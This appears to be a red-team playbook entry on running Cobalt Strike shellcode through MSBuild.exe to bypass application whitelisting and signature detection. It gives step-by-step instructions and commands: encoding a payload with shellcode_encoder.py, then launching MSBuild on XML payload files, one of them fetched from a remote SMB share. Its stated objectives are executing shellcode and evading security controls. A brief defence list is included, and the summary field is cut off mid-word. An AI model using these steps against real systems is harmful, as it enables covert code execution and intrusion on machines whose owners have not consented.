---
id: 61ce39f8-0f80-452b-8df9-29280d9e6001
name: MSBuild Shellcode Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.393687+00:00'
updated_at: '2023-04-10T20:36:24.555346+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Trusted Developer Utilities|T1127 - Trusted Developer Utilities]]'
tags:
- '[[Cobalt Strike]]'
- '[[Custom Payloads]]'
- '[[Payloads]]'
commands:
- '[[Build x64 DNS Raw Payload]]'
- '[[Build x86 DNS Raw Payload]]'
- '[[Generate Encoded Shellcode]]'
---

# MSBuild Shellcode Execution

## Summary

MSBuild is a command-line tool used to build .NET applications. In this case, it can also be used to execute shellcode within a .NET executable. This technique can be useful for bypassing certain security controls that may be in place. By using MSBuild, attackers can execute shellcode without havin

## Description

# Description

MSBuild is a command-line tool used to build .NET applications. In this case, it can also be used to execute shellcode within a .NET executable. This technique can be useful for bypassing certain security controls that may be in place. By using MSBuild, attackers can execute shellcode without having to drop it to disk, making it more difficult to detect. This technique can be used in conjunction with Cobalt Strike to deliver a custom payload to a target system. By using a custom payload, attackers can evade signature-based detection and increase their chances of success.

## Requirements

1. Access to a system with MSBuild installed

1. Cobalt Strike

## Defense

1. Disable or restrict access to MSBuild on critical systems

1. Implement application whitelisting to prevent unauthorized use of MSBuild

1. Monitor for suspicious use of MSBuild

## Objectives

1. Execute shellcode on a target system

1. Bypass security controls

1. Deliver a custom payload

# Instructions

1. To use MSBuild to execute shellcode in C, follow these steps:
1. Generate the payload using the Payload Generator and Scripted Web Delivery tools.
2. Encode the shellcode using the shellcode_encoder.py script with the desired options.
3. Use MSBuild.exe to execute the encoded shellcode by running the following commands:
  - For 64-bit systems: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
  - For 32-bit systems: %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml

**Code**: [[* Attacks > Packages > Payload Generator 
* Attack]]

> MSBuild.exe is a tool used to build .NET applications. It can also be used to execute shellcode by embedding the shellcode in an XML file and using MSBuild.exe to execute it. This technique can be used to bypass application whitelisting and other security measures. The shellcode must be encoded before being embedded in the XML file to avoid detection. The shellcode_encoder.py script can be used to encode the shellcode with various options. The encoded shellcode is then embedded in the XML file using the appropriate syntax.

**Command** ([[Generate Encoded Shellcode]]):

```bash
$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
```

**Command** ([[Build x64 DNS Raw Payload]]):

```bash
$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
```

**Command** ([[Build x86 DNS Raw Payload]]):

```bash
$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Trusted Developer Utilities|T1127 - Trusted Developer Utilities]]

## Commands Used

- [[Build x64 DNS Raw Payload]]
- [[Build x86 DNS Raw Payload]]
- [[Generate Encoded Shellcode]]

## Tags

- [[Cobalt Strike]]
- [[Custom Payloads]]
- [[Payloads]]
